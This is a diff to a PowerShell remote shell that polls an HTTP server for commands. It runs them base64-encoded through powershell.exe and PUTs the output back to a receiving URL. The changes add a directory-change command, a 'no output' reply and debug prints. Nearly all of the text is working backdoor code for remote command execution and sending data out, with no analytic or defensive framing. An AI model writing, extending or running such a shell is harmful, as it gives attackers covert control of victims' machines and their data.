@@ -53,14 +53,19 @@ function Invoke-Cmd([string] $command) {
     $response = ""
     if ($command) {
         Write-Verbose "Recieved command: $command"
+
         try {
             # Encode the command as base64 and send to powershell
             # This seems to solve some issues around formatting and escaping
+
+            #cd
+
             $commandbytes = [System.Text.Encoding]::Unicode.GetBytes($command)
             $base64command = [System.Convert]::ToBase64String($commandbytes)
             $response = &powershell.exe -EncodedCommand "$base64command" 2>&1 | Out-String
         }
         catch {
+            Write-Output "error"
             $response = $error[0]
         }
         Write-Verbose "The response: $response"
@@ -72,6 +77,9 @@ function Send-Response([string] $response) {
     if ($response) {
         Invoke-RestMethod -Method "PUT" -Body $response $recv_url
     }
+    else {
+        Invoke-RestMethod -Method "PUT" -Body "no output" $recv_url
+    }
 }
 
 # Do get requests to the http server every 500ms
@@ -81,15 +89,29 @@ $connected = $true
 while ($connected) {
 
     $command = Get-Command
-
+    
     # Look for the end command which stops the shell remotely
-    if ($command -like "*$END_CMD*") {
-        Write-Verbose "Shutting down"
-        $connected = $false
-    } else {
-        # Else execute the command and send the response
-        $response = Invoke-Cmd $command
-        Send-Response $response
+    if ($command.Length -gt 2) {
+        Write-Output "co$command, L " $command.Length
+        if ($command -like "*$END_CMD*") {
+            Write-Verbose "Shutting down"
+            $connected = $false
+        }
+        elseif ($command.IndexOf("000") -eq 0) {
+       
+            $t = $command.Substring(3, $command.Length - 5)
+            Write-Output "[[[$t]]]"
+            Set-Location -Path $t
+            Send-Response "no response"
+        }
+        else {
+            # Else execute the command and send the response
+            $response = Invoke-Cmd $command
+            # Write-Output $response.Length
+            
+            Send-Response $response
+            Write-Output "hi" $response.Length
+        }
     }
     # Wait a short time before the next read/write loop
     start-sleep -Milliseconds $WAIT_MS
